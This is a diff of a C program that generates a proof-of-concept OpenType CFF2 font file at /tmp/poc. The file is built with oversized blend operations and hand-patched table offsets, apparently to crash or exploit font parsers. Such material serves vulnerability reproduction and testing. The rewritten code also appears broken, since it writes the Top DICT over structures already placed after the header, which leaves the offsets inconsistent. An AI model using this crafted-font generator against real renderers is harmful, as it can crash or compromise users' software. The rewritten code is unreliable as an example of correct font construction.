@@ -2,296 +2,129 @@
 #include <stdlib.h>
 #include <stdint.h>
 
-static void write_uint16(FILE *f, uint16_t v) {
-    fputc((v >> 8) & 0xff, f);
-    fputc(v & 0xff, f);
+static void w16(FILE *f, uint16_t v) {
+    fputc((v >> 8) & 0xFF, f);
+    fputc(v & 0xFF, f);
 }
 
-static void write_uint32(FILE *f, uint32_t v) {
-    fputc((v >> 24) & 0xff, f);
-    fputc((v >> 16) & 0xff, f);
-    fputc((v >> 8) & 0xff, f);
-    fputc(v & 0xff, f);
+static void w32(FILE *f, uint32_t v) {
+    fputc((v >> 24) & 0xFF, f);
+    fputc((v >> 16) & 0xFF, f);
+    fputc((v >> 8) & 0xFF, f);
+    fputc(v & 0xFF, f);
 }
 
-static void write_fixed(FILE *f, double v) {
-    int32_t val = (int32_t)(v * 65536.0);
-    write_uint32(f, (uint32_t)val);
-}
-
-static void write_f2dot14(FILE *f, double v) {
-    int16_t val = (int16_t)(v * 16384.0);
-    write_uint16(f, (uint16_t)val);
+static void push_int28(FILE *f, uint16_t v) {
+    fputc(0x1C, f);
+    w16(f, v);
 }
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
-    if (!f) { perror("fopen"); return 1; }
+    if (!f) return 1;
 
-    /* ========== OpenType header ========== */
+    /* OpenType header */
     fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
-    write_uint16(f, 2);
-    write_uint16(f, 0);
-    write_uint16(f, 0);
-    write_uint16(f, 0);
+    w16(f, 1); w16(f, 0); w16(f, 0); w16(f, 0);
 
-    /* ========== Table 1: CFF2 ========== */
+    /* Table record for CFF2 */
     fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
-    write_uint32(f, 0);
-    long cff2_offset_pos = ftell(f);
-    write_uint32(f, 0);
-    write_uint32(f, 0);
+    w32(f, 0);
+    long off_pos = ftell(f);
+    w32(f, 0); w32(f, 0);
 
     long cff2_start = ftell(f);
 
     /* CFF2 Header */
-    fputc(0x02, f);
-    fputc(0x00, f);
-    fputc(0x05, f);
+    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f);
+    long top_len_pos = ftell(f);
+    w16(f, 0);
+
+    /* Write all other structures first to compute offsets */
+    /* Global Subr INDEX (empty) */
+    long gsubr_start = ftell(f);
+    w32(f, 0);
+    long gsubr_end = ftell(f);
+
+    /* FDArray INDEX */
+    long fdarray_start = ftell(f);
+    w32(f, 1);
+    fputc(0x01, f);
     fputc(0x01, f);
 
-    long tdl_pos = ftell(f);
-    write_uint16(f, 0);
+    /* Private DICT data */
+    long private_dict_start = ftell(f);
+    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8C, f);
+    fputc(0x16, f); /* vsindex */
+    fputc(0x17, f); /* blend */
+    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8C, f);
+    fputc(0x16, f); /* vsindex */
+    fputc(0x17, f); /* blend */
+    long private_dict_end = ftell(f);
+    uint32_t private_dict_size = (uint32_t)(private_dict_end - private_dict_start);
+    uint32_t private_dict_offset = (uint32_t)(private_dict_start - cff2_start);
 
-    /* Top DICT */
-    long topdict_start = ftell(f);
-    fputc(0x8B, f); fputc(0x00, f); /* version */
-
-    /* maxstack: push 256 */
-    fputc(0x1C, f); fputc(0x01, f); fputc(0x00, f);
-    fputc(0x19, f);
-
-    /* FDSelect */
-    long fdselect_offset_pos = ftell(f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x0C, f); fputc(0x1E, f);
-
-    /* CharStrings */
-    long charstrings_offset_pos = ftell(f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x11, f);
-
-    /* FDArray */
-    long fdarray_offset_pos = ftell(f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x0C, f); fputc(0x24, f);
-
-    /* vstore */
-    long vstore_offset_pos = ftell(f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x18, f);
-
-    long topdict_end = ftell(f);
-    long topdict_len = topdict_end - topdict_start;
-    fseek(f, tdl_pos, SEEK_SET);
-    write_uint16(f, (uint16_t)topdict_len);
-    fseek(f, topdict_end, SEEK_SET);
-
-    /* Global Subr INDEX (empty) */
-    write_uint32(f, 0);
+    /* Font DICT */
+    push_int28(f, (uint16_t)private_dict_size);
+    push_int28(f, (uint16_t)private_dict_offset);
+    fputc(0x12, f);
+    long font_dict_end = ftell(f);
+    uint32_t font_dict_data_size = (uint32_t)(font_dict_end - (fdarray_start + 4 + 1 + 1 + 1));
+    fseek(f, fdarray_start + 4 + 1 + 1, SEEK_SET);
+    fputc((uint8_t)(1 + font_dict_data_size), f);
+    fseek(f, font_dict_end, SEEK_SET);
 
     /* FDSelect */
     long fdselect_start = ftell(f);
-    long fdselect_off = fdselect_start - cff2_start;
-    fseek(f, fdselect_offset_pos, SEEK_SET);
-    fputc(0x28, f);
-    fputc((fdselect_off >> 24) & 0xff, f);
-    fputc((fdselect_off >> 16) & 0xff, f);
-    fputc((fdselect_off >> 8) & 0xff, f);
-    fputc(fdselect_off & 0xff, f);
-    fseek(f, fdselect_start, SEEK_SET);
-    fputc(0x00, f);
-    write_uint16(f, 1);
+    w16(f, 1);
     fputc(0x00, f);
 
     /* CharStrings INDEX */
     long charstrings_start = ftell(f);
-    long charstrings_off = charstrings_start - cff2_start;
-    fseek(f, charstrings_offset_pos, SEEK_SET);
-    fputc(0x28, f);
-    fputc((charstrings_off >> 24) & 0xff, f);
-    fputc((charstrings_off >> 16) & 0xff, f);
-    fputc((charstrings_off >> 8) & 0xff, f);
-    fputc(charstrings_off & 0xff, f);
-    fseek(f, charstrings_start, SEEK_SET);
-
-    /* Write CharStrings INDEX with proper offset layout */
-    write_uint32(f, 1); /* count = 1 */
-    fputc(0x01, f);     /* offsize = 1 */
-    long cs_offset_pos = ftell(f);
-    fputc(0x00, f);     /* placeholder for offset1 */
-    fputc(0x00, f);     /* placeholder for offset2 */
-    long cs_data_start = ftell(f);
-    fputc(0x8B, f);     /* push 0 */
-    fputc(0x0E, f);     /* endchar = 14 */
-    long cs_data_end = ftell(f);
-    long cs_data_len = cs_data_end - cs_data_start;
-    fseek(f, cs_offset_pos, SEEK_SET);
-    fputc(0x01, f);                             /* offset1 = 1 */
-    fputc((uint8_t)(cs_data_len + 1), f);       /* offset2 = 1 + data_len */
-    fseek(f, cs_data_end, SEEK_SET);
-
-    /* FDArray INDEX */
-    long fdarray_start = ftell(f);
-    long fdarray_off = fdarray_start - cff2_start;
-    fseek(f, fdarray_offset_pos, SEEK_SET);
-    fputc(0x28, f);
-    fputc((fdarray_off >> 24) & 0xff, f);
-    fputc((fdarray_off >> 16) & 0xff, f);
-    fputc((fdarray_off >> 8) & 0xff, f);
-    fputc(fdarray_off & 0xff, f);
-    fseek(f, fdarray_start, SEEK_SET);
-
-    /* Write FDArray INDEX with proper offset layout */
-    write_uint32(f, 1); /* count = 1 */
-    fputc(0x01, f);     /* offsize = 1 */
-    long fd_offset_pos = ftell(f);
-    fputc(0x00, f);     /* placeholder for offset1 */
-    fputc(0x00, f);     /* placeholder for offset2 */
-    long fontdict_start = ftell(f);
-
-    /* Font DICT: Private operator */
-    long private_offset_pos = ftell(f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
-    fputc(0x12, f);
-
-    long fontdict_end = ftell(f);
-    long fontdict_len = fontdict_end - fontdict_start;
-
-    /* Patch FDArray INDEX offsets */
-    fseek(f, fd_offset_pos, SEEK_SET);
-    fputc(0x01, f);                                 /* offset1 = 1 */
-    fputc((uint8_t)(fontdict_len + 1), f);          /* offset2 = 1 + data_len */
-    fseek(f, fontdict_end, SEEK_SET);
-
-    /* Private DICT */
-    long private_start = ftell(f);
-    long private_off = private_start - cff2_start;
-    fseek(f, private_offset_pos + 4, SEEK_SET);
-    fputc(0x28, f);
-    fputc((private_off >> 24) & 0xff, f);
-    fputc((private_off >> 16) & 0xff, f);
-    fputc((private_off >> 8) & 0xff, f);
-    fputc(private_off & 0xff, f);
-    fputc(0x12, f);
-    fseek(f, private_start, SEEK_SET);
-
-    /* vsindex 0 */
-    fputc(0x8B, f);
-    fputc(0x16, f);
-
-    /* First blend: numBlends=50 */
-    int i;
-    for (i = 0; i < 50; i++) {
-        fputc(0x8B, f);
-        fputc(0x8B, f);
-        fputc(0x8B, f);
-    }
-    fputc(0xBD, f); /* push 50 */
-    fputc(0x17, f); /* blend */
-
-    /* Second blend: numBlends=50 */
-    for (i = 0; i < 50; i++) {
-        fputc(0x8B, f);
-        fputc(0x8B, f);
-        fputc(0x8B, f);
-    }
-    fputc(0xBD, f); /* push 50 */
-    fputc(0x17, f); /* blend */
-
-    long private_end = ftell(f);
-    long private_len = private_end - private_start;
-
-    fseek(f, private_offset_pos, SEEK_SET);
-    fputc(0x28, f);
-    fputc((private_len >> 24) & 0xff, f);
-    fputc((private_len >> 16) & 0xff, f);
-    fputc((private_len >> 8) & 0xff, f);
-    fputc(private_len & 0xff, f);
-    fputc(0x28, f);
-    fputc((private_off >> 24) & 0xff, f);
-    fputc((private_off >> 16) & 0xff, f);
-    fputc((private_off >> 8) & 0xff, f);
-    fputc(private_off & 0xff, f);
-    fputc(0x12, f);
-    fseek(f, private_end, SEEK_SET);
+    w32(f, 1);
+    fputc(0x01, f);
+    fputc(0x01, f);
+    fputc(0x02, f);
+    fputc(0x0E, f);
 
     /* VariationStore */
-    long vs_start = ftell(f);
-    long vs_off = vs_start - cff2_start;
-    fseek(f, vstore_offset_pos, SEEK_SET);
-    fputc(0x28, f);
-    fputc((vs_off >> 24) & 0xff, f);
-    fputc((vs_off >> 16) & 0xff, f);
-    fputc((vs_off >> 8) & 0xff, f);
-    fputc(vs_off & 0xff, f);
-    fputc(0x18, f);
-    fseek(f, vs_start, SEEK_SET);
+    long vstore_start = ftell(f);
+    w16(f, 1);
+    w32(f, 10);
+    w16(f, 1);
+    w32(f, 10 + 4 + 4 + 2 + 2 + 6);
+    w16(f, 1);
+    w16(f, 1);
+    w16(f, 0); w16(f, 0x4000); w16(f, 0x4000);
+    w16(f, 1);
+    w16(f, 0);
+    w16(f, 1);
+    w16(f, 0);
+    w16(f, 0);
+    long vstore_end = ftell(f);
 
-    write_uint16(f, 1);
-    long vrlo_pos = ftell(f);
-    write_uint32(f, 0);
-    write_uint16(f, 1);
-    long ivdo_pos = ftell(f);
-    write_uint32(f, 0);
+    /* Now write Top DICT with correct offsets */
+    fseek(f, top_len_pos + 2, SEEK_SET); /* after topDictLength field */
+    push_int28(f, (uint16_t)(vstore_start - cff2_start));
+    fputc(0x18, f); /* VStore */
+    push_int28(f, (uint16_t)(fdarray_start - cff2_start));
+    fputc(0x0C, f); fputc(0x24, f); /* FDArray */
+    push_int28(f, (uint16_t)(fdselect_start - cff2_start));
+    fputc(0x0C, f); fputc(0x25, f); /* FDSelect */
+    push_int28(f, (uint16_t)(charstrings_start - cff2_start));
+    fputc(0x11, f); /* CharStrings */
+    long top_dict_end = ftell(f);
+    uint16_t top_dict_len = (uint16_t)(top_dict_end - (top_len_pos + 2));
+    fseek(f, top_len_pos, SEEK_SET);
+    w16(f, top_dict_len);
+    fseek(f, top_dict_end, SEEK_SET);
 
-    long vrl_start = ftell(f);
-    long vrl_off = vrl_start - vs_start;
-    fseek(f, vrlo_pos, SEEK_SET);
-    write_uint32(f, (uint32_t)vrl_off);
-    fseek(f, vrl_start, SEEK_SET);
-
-    write_uint16(f, 1);
-    write_uint16(f, 1);
-    write_uint16(f, 0);
-    write_f2dot14(f, 0.0);
-    write_f2dot14(f, 1.0);
-    write_f2dot14(f, 1.0);
-
-    long ivd_start = ftell(f);
-    long ivd_off = ivd_start - vs_start;
-    fseek(f, ivdo_pos, SEEK_SET);
-    write_uint32(f, (uint32_t)ivd_off);
-    fseek(f, ivd_start, SEEK_SET);
-
-    write_uint16(f, 1);
-    write_uint16(f, 0);
-    write_uint16(f, 1);
-    write_uint16(f, 0);
-    write_uint16(f, 0);
-
+    /* Patch OpenType table record */
     long cff2_end = ftell(f);
-    long cff2_len = cff2_end - cff2_start;
-    fseek(f, cff2_offset_pos, SEEK_SET);
-    write_uint32(f, (uint32_t)cff2_start);
-    write_uint32(f, (uint32_t)cff2_len);
-
-    /* fvar table */
-    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f);
-    write_uint32(f, 0);
-    long fvar_offset_pos = ftell(f);
-    write_uint32(f, 0);
-    write_uint32(f, 0);
-
-    long fvar_start = ftell(f);
-    write_uint32(f, 0x00010000);
-    write_uint16(f, 1);  /* 1 axis */
-    write_uint16(f, 0);
-    write_uint16(f, 0);
-
-    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
-    write_fixed(f, 1.0);
-    write_fixed(f, 1.0);
-    write_fixed(f, 1.0);
-    write_uint16(f, 0);
-    write_uint16(f, 0);
-
-    long fvar_end = ftell(f);
-    long fvar_len = fvar_end - fvar_start;
-    fseek(f, fvar_offset_pos, SEEK_SET);
-    write_uint32(f, (uint32_t)fvar_start);
-    write_uint32(f, (uint32_t)fvar_len);
+    uint32_t cff2_length = (uint32_t)(cff2_end - cff2_start);
+    fseek(f, off_pos, SEEK_SET);
+    w32(f, (uint32_t)cff2_start);
+    w32(f, cff2_length);
 
     fclose(f);
     return 0;
